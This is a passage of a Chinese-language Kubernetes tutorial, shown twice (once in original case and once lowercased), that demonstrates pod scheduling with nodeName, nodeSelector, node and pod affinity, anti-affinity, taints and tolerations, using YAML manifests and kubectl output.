......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n接下来再演示一下 requiredDuringSchedulingIgnoredDuringExecution , 创建 pod-nodeaffinity-preferred.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodeaffinity-preferred\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    nodeAffinity: #设置node亲和性\n      preferredDuringSchedulingIgnoredDuringExecution: # 软限制\n      - weight: 1\n        preference:\n          matchExpressions: # 匹配env的值在["xxx","yyy"]中的标签(当前环境没有)\n          - key: nodeenv\n            operator: In\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-preferred.yaml\npod/pod-nodeaffinity-preferred created\n\n# 查看pod状态 （运行成功）\n[root@k8s-master01 ~]# kubectl get pod pod-nodeaffinity-preferred -n dev\nNAME                         READY   STATUS    RESTARTS   AGE\npod-nodeaffinity-preferred   1/1     Running   0          40s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n> NodeAffinity 规则设置的注意事项：\n> 1 如果同时定义了 nodeSelector 和 nodeAffinity，那么必须两个条件都得到满足，Pod 才能运行在指定的 Node 上\n> 2 如果 nodeAffinity 指定了多个 nodeSelectorTerms，那么只需要其中一个能够匹配成功即可\n> 3 如果一个 nodeSelectorTerms 中有多个 matchExpressions ，则一个节点必须满足所有的才能匹配成功\n> 4 如果一个 pod 所在的 Node 在 Pod 运行期间其标签发生了改变，不再符合该 Pod 的节点亲和性需求，则系统将忽略此变化\n\nPodAffinity\nPodAffinity 主要实现以运行的 Pod 为参照，实现让新创建的 Pod 跟参照 pod 在一个区域的功能。首先来看一下 PodAffinity 的可配置项：\n\npod.spec.affinity.podAffinity\n  requiredDuringSchedulingIgnoredDuringExecution  硬限制\n    namespaces       指定参照pod的namespace\n    topologyKey      指定调度作用域\n    labelSelector    标签选择器\n      matchExpressions  按节点标签列出的节点选择器要求列表(推荐)\n        key    键\n        values 值\n        operator 关系符 支持In, NotIn, Exists, DoesNotExist.\n      matchLabels    指多个matchExpressions映射的内容\n  preferredDuringSchedulingIgnoredDuringExecution 软限制\n    podAffinityTerm  选项\n      namespaces      \n      topologyKey\n      labelSelector\n        matchExpressions  \n          key    键\n          values 值\n          operator\n        matchLabels \n    weight 倾向权重，在范围1-100\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n> topologyKey 用于指定调度时作用域，例如:\n> 如果指定为 kubernetes.io/hostname，那就是以 Node 节点为区分范围\n> 如果指定为 beta.kubernetes.io/os, 则以 Node 节点的操作系统类型来区分\n\n接下来，演示下 requiredDuringSchedulingIgnoredDuringExecution\n1）首先创建一个参照 Pod，pod-podaffinity-target.yaml：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-podaffinity-target\n  namespace: dev\n  labels:\n    podenv: pro #设置标签\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeName: node1 # 将目标pod名确指定到node1上\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 启动目标pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-target.yaml\npod/pod-podaffinity-target created\n\n# 查看pod状况\n[root@k8s-master01 ~]# kubectl get pods  pod-podaffinity-target -n dev\nNAME                     READY   STATUS    RESTARTS   AGE\npod-podaffinity-target   1/1     Running   0          4s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n2）创建 pod-podaffinity-required.yaml，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-podaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    podAffinity: #设置pod亲和性\n      requiredDuringSchedulingIgnoredDuringExecution: # 硬限制\n      - labelSelector:\n          matchExpressions: # 匹配env的值在["xxx","yyy"]中的标签\n          - key: podenv\n            operator: In\n            values: ["xxx","yyy"]\n        topologyKey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n上面配置表达的意思是：新 Pod 必须要与拥有标签 nodeenv=xxx 或者 nodeenv=yyy 的 pod 在同一 Node 上，显然现在没有这样 pod，接下来，运行测试一下。\n\n# 启动pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# 查看pod状态，发现未运行\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nNAME                       READY   STATUS    RESTARTS   AGE\npod-podaffinity-required   0/1     Pending   0          9s\n\n# 查看详细信息\n[root@k8s-master01 ~]# kubectl describe pods pod-podaffinity-required  -n dev\n......\nEvents:\n  Type     Reason            Age        From               Message\n  ----     ------            ----       ----               -------\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 2 node(s) didn\'t match pod affinity rules, 1 node(s) had taints that the pod didn\'t tolerate.\n\n# 接下来修改  values: ["xxx","yyy"]-----\x3evalues:["pro","yyy"]\n# 意思是：新Pod必须要与拥有标签nodeenv=xxx或者nodeenv=yyy的pod在同一Node上\n[root@k8s-master01 ~]# vim pod-podaffinity-required.yaml\n\n# 然后重新创建pod，查看效果\n[root@k8s-master01 ~]# kubectl delete -f  pod-podaffinity-required.yaml\npod "pod-podaffinity-required" deleted\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# 发现此时Pod运行正常\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nNAME                       READY   STATUS    RESTARTS   AGE   LABELS\npod-podaffinity-required   1/1     Running   0          6s    <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n关于 PodAffinity 的 preferredDuringSchedulingIgnoredDuringExecution ，这里不再演示。\nPodAntiAffinity\n\nPodAntiAffinity 主要实现以运行的 Pod 为参照，让新创建的 Pod 跟参照 pod 不在一个区域中的功能。\n\n它的配置方式和选项跟 PodAffinty 是一样的，这里不再做详细解释，直接做一个测试案例。\n\n1）继续使用上个案例中目标 pod\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nNAME                     READY   STATUS    RESTARTS   AGE     IP            NODE    LABELS\npod-podaffinity-required 1/1     Running   0          3m29s   10.244.1.38   node1   <none>     \npod-podaffinity-target   1/1     Running   0          9m25s   10.244.1.37   node1   podenv=pro\n\n\n1\n2\n3\n4\n\n\n2）创建 pod-podantiaffinity-required.yaml，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-podantiaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    podAntiAffinity: #设置pod亲和性\n      requiredDuringSchedulingIgnoredDuringExecution: # 硬限制\n      - labelSelector:\n          matchExpressions: # 匹配podenv的值在["pro"]中的标签\n          - key: podenv\n            operator: In\n            values: ["pro"]\n        topologyKey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n上面配置表达的意思是：新 Pod 必须要与拥有标签 nodeenv=pro 的 pod 不在同一 Node 上，运行测试一下。\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-podantiaffinity-required.yaml\npod/pod-podantiaffinity-required created\n\n# 查看pod\n# 发现调度到了node2上\n[root@k8s-master01 ~]# kubectl get pods pod-podantiaffinity-required -n dev -o wide\nNAME                           READY   STATUS    RESTARTS   AGE   IP            NODE   .. \npod-podantiaffinity-required   1/1     Running   0          30s   10.244.1.96   node2  ..\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 污点和容忍\n\n污点（Taints）\n\n前面的调度方式都是站在 Pod 的角度上，通过在 Pod 上添加属性，来确定 Pod 是否要调度到指定的 Node 上，其实我们也可以站在 Node 的角度上，通过在 Node 上添加污点属性，来决定是否允许 Pod 调度过来。\n\nNode 被设置上污点之后就和 Pod 之间存在了一种相斥的关系，进而拒绝 Pod 调度进来，甚至可以将已经存在的 Pod 驱逐出去。\n\n污点的格式为： key=value:effect , key 和 value 是污点的标签，effect 描述污点的作用，支持如下三个选项：\n\n * PreferNoSchedule：kubernetes 将尽量避免把 Pod 调度到具有该污点的 Node 上，除非没有其他节点可调度\n * NoSchedule：kubernetes 将不会把 Pod 调度到具有该污点的 Node 上，但不会影响当前 Node 上已存在的 Pod\n * NoExecute：kubernetes 将不会把 Pod 调度到具有该污点的 Node 上，同时也会将 Node 上已存在的 Pod 驱离\n\n\n\n使用 kubectl 设置和去除污点的命令示例如下：\n\n# 设置污点\nkubectl taint nodes 节点名称 key=value:effect\n\n# 去除污点\nkubectl taint nodes 节点名称 key:effect-\n\n# 去除所有污点\nkubectl taint nodes 节点名称 key-\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n接下来，演示下污点的效果：\n\n 1. 准备节点 node1（为了演示效果更加明显，暂时停止 node2 节点）\n 2. 为 node1 节点设置一个污点: tag=heima:PreferNoSchedule ；然后创建 pod1 (pod1 可以)\n 3. 修改为 node1 节点设置一个污点: tag=heima:NoSchedule ；然后创建 pod2 (pod1 正常 pod2 失败)\n 4. 修改为 node1 节点设置一个污点: tag=heima:NoExecute ；然后创建 pod3 (3 个 pod 都失败)\n\n# 为node1设置污点(PreferNoSchedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:PreferNoSchedule\n\n# 创建pod1\n[root@k8s-master01 ~]# kubectl run taint1 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME                      READY   STATUS    RESTARTS   AGE     IP           NODE   \ntaint1-7665f7fd85-574h4   1/1     Running   0          2m24s   10.244.1.59   node1    \n\n# 为node1设置污点(取消PreferNoSchedule，设置NoSchedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:PreferNoSchedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:NoSchedule\n\n# 创建pod2\n[root@k8s-master01 ~]# kubectl run taint2 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods taint2 -n dev -o wide\nNAME                      READY   STATUS    RESTARTS   AGE     IP            NODE\ntaint1-7665f7fd85-574h4   1/1     Running   0          2m24s   10.244.1.59   node1 \ntaint2-544694789-6zmlf    0/1     Pending   0          21s     <none>        <none>   \n\n# 为node1设置污点(取消NoSchedule，设置NoExecute)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:NoSchedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:NoExecute\n\n# 创建pod3\n[root@k8s-master01 ~]# kubectl run taint3 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME                      READY   STATUS    RESTARTS   AGE   IP       NODE     NOMINATED \ntaint1-7665f7fd85-htkmp   0/1     Pending   0          35s   <none>   <none>   <none>    \ntaint2-544694789-bn7wb    0/1     Pending   0          35s   <none>   <none>   <none>     \ntaint3-6d78dbd749-tktkq   0/1     Pending   0          6s    <none>   <none>   <none>     \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n> 使用 kubeadm 搭建的集群，默认就会给 master 节点添加一个污点标记，所以 pod 就不会调度到 master 节点上.\n\n容忍（Toleration）\n\n上面介绍了污点的作用，我们可以在 node 上添加污点用于拒绝 pod 调度上来，但是如果就是想将一个 pod 调度到一个有污点的 node 上去，这时候应该怎么做呢？这就要使用到容忍。\n\n\n\n> 污点就是拒绝，容忍就是忽略，Node 通过污点拒绝 pod 调度上去，Pod 通过容忍忽略拒绝\n\n下面先通过一个案例看下效果：\n\n 1. 上一小节，已经在 node1 节点上打上了 NoExecute 的污点，此时 pod 是调度不上去的\n 2. 本小节，可以通过给 pod 添加容忍，然后将其调度上去\n\n创建 pod-toleration.yaml, 内容如下\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-toleration\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  tolerations:      # 添加容忍\n  - key: "tag"        # 要容忍的污点的key\n    operator: "Equal" # 操作符\n    value: "heima"    # 容忍的污点的value\n    effect: "NoExecute"   # 添加容忍的规则，这里必须和标记的污点规则相同\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# 添加容忍之前的pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME             READY   STATUS    RESTARTS   AGE   IP       NODE     NOMINATED \npod-toleration   0/1     Pending   0          3s    <none>   <none>   <none>           \n\n# 添加容忍之后的pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME             READY   STATUS    RESTARTS   AGE   IP            NODE    NOMINATED\npod-toleration   1/1     Running   0          3s    10.244.1.62   node1   <none>        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n下面看一下容忍的详细配置:\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.tolerations\n......\nFIELDS:\n   key       \n   value     \n   operator  \n   effect    \n   tolerationSeconds  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * key 对应着要容忍的污点的键，空意味着匹配所有的键\n * value 对应着要容忍的污点的值\n * operator key-value 的运算符，支持 Equal 和 Exists（默认）\n * effect 对应污点的 effect，空意味着匹配所有影响\n * tolerationSeconds 容忍时间，当 effect 为 NoExecute 时生效，表示 pod 在 Node 上的停留时间',normalizedContent:'在默认情况下，一个 pod 在哪个 node 节点上运行，是由 scheduler 组件采用相应的算法计算出来的，这个过程是不受人工控制的。但是在实际使用中，这并不满足的需求，因为很多情况下，我们想控制某些 pod 到达某些节点上，那么应该怎么做呢？这就要求了解 kubernetes 对 pod 的调度规则，kubernetes 提供了四大类调度方式：\n\n * 自动调度：运行在哪个节点上完全由 scheduler 经过一系列的算法计算得出\n * 定向调度：nodename、nodeselector\n * 亲和性调度：nodeaffinity、podaffinity、podantiaffinity\n * 污点（容忍）调度：taints、toleration\n\n\n# 定向调度\n\n定向调度，指的是利用在 pod 上声明 nodename 或者 nodeselector，以此将 pod 调度到期望的 node 节点上。注意，这里的调度是强制的，这就意味着即使要调度的目标 node 不存在，也会向上面进行调度，只不过 pod 运行失败而已。\n\nnodename\n\nnodename 用于强制约束将 pod 调度到指定的 name 的 node 节点上。这种方式，其实是直接跳过 scheduler 的调度逻辑，直接将 pod 调度到指定名称的节点。\n\n接下来，实验一下：创建一个 pod-nodename.yaml 文件\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodename\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodename: node1 # 指定调度到node1节点上\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n#创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#查看pod调度到node属性，确实是调度到了node1节点上\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nname           ready   status    restarts   age   ip            node      ......\npod-nodename   1/1     running   0          56s   10.244.1.87   node1     ......   \n\n# 接下来，删除pod，修改nodename的值为node3（并没有node3节点）\n[root@k8s-master01 ~]# kubectl delete -f pod-nodename.yaml\npod "pod-nodename" deleted\n[root@k8s-master01 ~]# vim pod-nodename.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#再次查看，发现已经向node3节点调度，但是由于不存在node3节点，所以pod无法正常运行\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nname           ready   status    restarts   age   ip       node    ......\npod-nodename   0/1     pending   0          6s    <none>   node3   ......        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nnodeselector\n\nnodeselector 用于将 pod 调度到添加了指定标签的 node 节点上。它是通过 kubernetes 的 label-selector 机制实现的，也就是说，在 pod 创建之前，会由 scheduler 使用 matchnodeselector 调度策略进行 label 匹配，找出目标 node，然后将 pod 调度到目标节点，该匹配规则是强制约束。\n\n接下来，实验一下：\n\n1 首先分别为 node 节点添加标签\n\n[root@k8s-master01 ~]# kubectl label nodes node1 nodeenv=pro\nnode/node2 labeled\n[root@k8s-master01 ~]# kubectl label nodes node2 nodeenv=test\nnode/node2 labeled\n\n\n1\n2\n3\n4\n\n\n2 创建一个 pod-nodeselector.yaml 文件，并使用它创建 pod\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodeselector\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeselector: \n    nodeenv: pro # 指定调度到具有nodeenv=pro标签的节点上\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n#创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#查看pod调度到node属性，确实是调度到了node1节点上\n[root@k8s-master01 ~]# kubectl get pods pod-nodeselector -n dev -o wide\nname               ready   status    restarts   age     ip          node    ......\npod-nodeselector   1/1     running   0          47s   10.244.1.87   node1   ......\n\n# 接下来，删除pod，修改nodeselector的值为nodeenv: xxxx（不存在打有此标签的节点）\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeselector.yaml\npod "pod-nodeselector" deleted\n[root@k8s-master01 ~]# vim pod-nodeselector.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#再次查看，发现pod无法正常运行,node的值为none\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname               ready   status    restarts   age     ip       node    \npod-nodeselector   0/1     pending   0          2m20s   <none>   <none>\n\n# 查看详情,发现node selector匹配失败的提示\n[root@k8s-master01 ~]# kubectl describe pods pod-nodeselector -n dev\n.......\nevents:\n  type     reason            age        from               message\n  ----     ------            ----       ----               -------\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 亲和性调度\n\n介绍了两种定向调度的方式，使用起来非常方便，但是也有一定的问题，那就是如果没有满足条件的 node，那么 pod 将不会被运行，即使在集群中还有可用 node 列表也不行，这就限制了它的使用场景。\n\n基于上面的问题，kubernetes 还提供了一种亲和性调度（affinity）。它在 nodeselector 的基础之上的进行了扩展，可以通过配置的形式，实现优先选择满足条件的 node 进行调度，如果没有，也可以调度到不满足条件的节点上，使调度更加灵活。\n\naffinity 主要分为三类：\n\n * nodeaffinity (node 亲和性）: 以 node 为目标，解决 pod 可以调度到哪些 node 的问题\n * podaffinity (pod 亲和性) : 以 pod 为目标，解决 pod 可以和哪些已存在的 pod 部署在同一个拓扑域中的问题\n * podantiaffinity (pod 反亲和性) : 以 pod 为目标，解决 pod 不能和哪些已存在 pod 部署在同一个拓扑域中的问题\n\n> 关于亲和性 (反亲和性) 使用场景的说明：\n> 亲和性：如果两个应用频繁交互，那就有必要利用亲和性让两个应用的尽可能的靠近，这样可以减少因网络通信而带来的性能损耗。\n> 反亲和性：当应用的采用多副本部署时，有必要采用反亲和性让各个应用实例打散分布在各个 node 上，这样可以提高服务的高可用性。\n\nnodeaffinity\n\n首先来看一下 nodeaffinity 的可配置项：\n\npod.spec.affinity.nodeaffinity\n  requiredduringschedulingignoredduringexecution  node节点必须满足指定的所有规则才可以，相当于硬限制\n    nodeselectorterms  节点选择列表\n      matchfields   按节点字段列出的节点选择器要求列表\n      matchexpressions   按节点标签列出的节点选择器要求列表(推荐)\n        key    键\n        values 值\n        operator 关系符 支持exists, doesnotexist, in, notin, gt, lt\n  preferredduringschedulingignoredduringexecution 优先调度到满足指定的规则的node，相当于软限制 (倾向)\n    preference   一个节点选择器项，与相应的权重相关联\n      matchfields   按节点字段列出的节点选择器要求列表\n      matchexpressions   按节点标签列出的节点选择器要求列表(推荐)\n        key    键\n        values 值\n        operator 关系符 支持in, notin, exists, doesnotexist, gt, lt\n\tweight 倾向权重，在范围1-100。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n关系符的使用说明:\n\n- matchexpressions:\n  - key: nodeenv              # 匹配存在标签的key为nodeenv的节点\n    operator: exists\n  - key: nodeenv              # 匹配标签的key为nodeenv,且value是"xxx"或"yyy"的节点\n    operator: in\n    values: ["xxx","yyy"]\n  - key: nodeenv              # 匹配标签的key为nodeenv,且value大于"xxx"的节点\n    operator: gt\n    values: "xxx"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n接下来首先演示一下 requiredduringschedulingignoredduringexecution , 创建 pod-nodeaffinity-required.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodeaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    nodeaffinity: #设置node亲和性\n      requiredduringschedulingignoredduringexecution: # 硬限制\n        nodeselectorterms:\n        - matchexpressions: # 匹配env的值在["xxx","yyy"]中的标签\n          - key: nodeenv\n            operator: in\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# 查看pod状态 （运行失败）\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nname                        ready   status    restarts   age   ip       node    ...... \npod-nodeaffinity-required   0/1     pending   0          16s   <none>   <none>  ......\n\n# 查看pod的详情\n# 发现调度失败，提示node选择失败\n[root@k8s-master01 ~]# kubectl describe pod pod-nodeaffinity-required -n dev\n......\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n#接下来，停止pod\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeaffinity-required.yaml\npod "pod-nodeaffinity-required" deleted\n\n# 修改文件，将values: ["xxx","yyy"]------\x3e ["pro","yyy"]\n[root@k8s-master01 ~]# vim pod-nodeaffinity-required.yaml\n\n# 再次启动\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# 此时查看，发现调度成功，已经将pod调度到了node1上\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nname                        ready   status    restarts   age   ip            node  ...... \npod-nodeaffinity-required   1/1     running   0          11s   10.244.1.89   node1 ......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n接下来再演示一下 requiredduringschedulingignoredduringexecution , 创建 pod-nodeaffinity-preferred.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodeaffinity-preferred\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    nodeaffinity: #设置node亲和性\n      preferredduringschedulingignoredduringexecution: # 软限制\n      - weight: 1\n        preference:\n          matchexpressions: # 匹配env的值在["xxx","yyy"]中的标签(当前环境没有)\n          - key: nodeenv\n            operator: in\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-preferred.yaml\npod/pod-nodeaffinity-preferred created\n\n# 查看pod状态 （运行成功）\n[root@k8s-master01 ~]# kubectl get pod pod-nodeaffinity-preferred -n dev\nname                         ready   status    restarts   age\npod-nodeaffinity-preferred   1/1     running   0          40s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n> nodeaffinity 规则设置的注意事项：\n> 1 如果同时定义了 nodeselector 和 nodeaffinity，那么必须两个条件都得到满足，pod 才能运行在指定的 node 上\n> 2 如果 nodeaffinity 指定了多个 nodeselectorterms，那么只需要其中一个能够匹配成功即可\n> 3 如果一个 nodeselectorterms 中有多个 matchexpressions ，则一个节点必须满足所有的才能匹配成功\n> 4 如果一个 pod 所在的 node 在 pod 运行期间其标签发生了改变，不再符合该 pod 的节点亲和性需求，则系统将忽略此变化\n\npodaffinity\npodaffinity 主要实现以运行的 pod 为参照，实现让新创建的 pod 跟参照 pod 在一个区域的功能。首先来看一下 podaffinity 的可配置项：\n\npod.spec.affinity.podaffinity\n  requiredduringschedulingignoredduringexecution  硬限制\n    namespaces       指定参照pod的namespace\n    topologykey      指定调度作用域\n    labelselector    标签选择器\n      matchexpressions  按节点标签列出的节点选择器要求列表(推荐)\n        key    键\n        values 值\n        operator 关系符 支持in, notin, exists, doesnotexist.\n      matchlabels    指多个matchexpressions映射的内容\n  preferredduringschedulingignoredduringexecution 软限制\n    podaffinityterm  选项\n      namespaces      \n      topologykey\n      labelselector\n        matchexpressions  \n          key    键\n          values 值\n          operator\n        matchlabels \n    weight 倾向权重，在范围1-100\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n> topologykey 用于指定调度时作用域，例如:\n> 如果指定为 kubernetes.io/hostname，那就是以 node 节点为区分范围\n> 如果指定为 beta.kubernetes.io/os, 则以 node 节点的操作系统类型来区分\n\n接下来，演示下 requiredduringschedulingignoredduringexecution\n1）首先创建一个参照 pod，pod-podaffinity-target.yaml：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-podaffinity-target\n  namespace: dev\n  labels:\n    podenv: pro #设置标签\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodename: node1 # 将目标pod名确指定到node1上\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 启动目标pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-target.yaml\npod/pod-podaffinity-target created\n\n# 查看pod状况\n[root@k8s-master01 ~]# kubectl get pods  pod-podaffinity-target -n dev\nname                     ready   status    restarts   age\npod-podaffinity-target   1/1     running   0          4s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n2）创建 pod-podaffinity-required.yaml，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-podaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    podaffinity: #设置pod亲和性\n      requiredduringschedulingignoredduringexecution: # 硬限制\n      - labelselector:\n          matchexpressions: # 匹配env的值在["xxx","yyy"]中的标签\n          - key: podenv\n            operator: in\n            values: ["xxx","yyy"]\n        topologykey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n上面配置表达的意思是：新 pod 必须要与拥有标签 nodeenv=xxx 或者 nodeenv=yyy 的 pod 在同一 node 上，显然现在没有这样 pod，接下来，运行测试一下。\n\n# 启动pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# 查看pod状态，发现未运行\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nname                       ready   status    restarts   age\npod-podaffinity-required   0/1     pending   0          9s\n\n# 查看详细信息\n[root@k8s-master01 ~]# kubectl describe pods pod-podaffinity-required  -n dev\n......\nevents:\n  type     reason            age        from               message\n  ----     ------            ----       ----               -------\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 2 node(s) didn\'t match pod affinity rules, 1 node(s) had taints that the pod didn\'t tolerate.\n\n# 接下来修改  values: ["xxx","yyy"]-----\x3evalues:["pro","yyy"]\n# 意思是：新pod必须要与拥有标签nodeenv=xxx或者nodeenv=yyy的pod在同一node上\n[root@k8s-master01 ~]# vim pod-podaffinity-required.yaml\n\n# 然后重新创建pod，查看效果\n[root@k8s-master01 ~]# kubectl delete -f  pod-podaffinity-required.yaml\npod "pod-podaffinity-required" deleted\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# 发现此时pod运行正常\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nname                       ready   status    restarts   age   labels\npod-podaffinity-required   1/1     running   0          6s    <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n关于 podaffinity 的 preferredduringschedulingignoredduringexecution ，这里不再演示。\npodantiaffinity\n\npodantiaffinity 主要实现以运行的 pod 为参照，让新创建的 pod 跟参照 pod 